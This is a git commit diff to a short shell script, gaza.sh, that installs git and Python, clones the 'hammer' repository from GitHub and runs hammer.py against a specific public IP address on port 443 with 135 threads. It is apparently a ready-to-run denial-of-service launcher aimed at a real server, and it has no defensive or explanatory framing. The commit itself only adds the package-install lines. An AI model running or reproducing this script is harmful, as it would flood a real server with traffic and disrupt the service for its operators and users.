1933f4024950d4ef1f0bae018646866662428df5
jehadislam <110744071+jehadislam@users.noreply.github.com>
2022-08-07 01:03:58 +0300

    Update gaza.sh

--- gaza.sh
+++ gaza.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
 
-
+apt install git
 git clone https://github.com/cyweb/hammer.git
 
 cd hammer
+
+apt install python
+apt install python3
 
 python3 hammer.py -s 45.60.207.1 -p 443 -t 135
 
